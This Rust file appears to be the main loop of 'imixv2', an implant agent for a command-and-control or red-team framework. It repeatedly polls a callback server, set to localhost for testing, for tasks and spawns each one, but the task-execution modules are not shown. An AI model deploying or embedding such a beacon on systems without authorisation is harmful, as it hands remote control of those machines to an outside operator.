use anyhow::{Result, Context};
use std::sync::Arc;
use std::time::Duration;
use tokio::time::sleep;

pub use transport::{ActiveTransport, Transport};
pub use pb::config::Config;
use crate::agent::ImixAgent;
use crate::task::TaskRegistry;

mod agent;
mod task;

#[tokio::main]
async fn main() -> Result<()> {
    pretty_env_logger::init();
    log::info!("Starting imixv2 agent");

    // Load config / defaults
    let mut config = Config::default();
    config.callback_uri = "http://localhost:8000".to_string(); // Default for testing
    // Note: IMIX_SERVER_PUBKEY is handled by pb crate env var or default

    let transport = ActiveTransport::new(config.callback_uri.clone(), None)
        .context("Failed to initialize transport")?;

    let agent = Arc::new(ImixAgent::new(config, transport));

    loop {
        match agent.fetch_tasks().await {
            Ok(tasks) => {
                for task in tasks {
                    log::info!("Claimed task: {}", task.id);
                    TaskRegistry::spawn(task, agent.clone());
                }
            }
            Err(e) => {
                log::error!("Callback failed: {}", e);
            }
        }

        let interval = agent.get_callback_interval_u64();
        sleep(Duration::from_secs(interval)).await;
    }
}
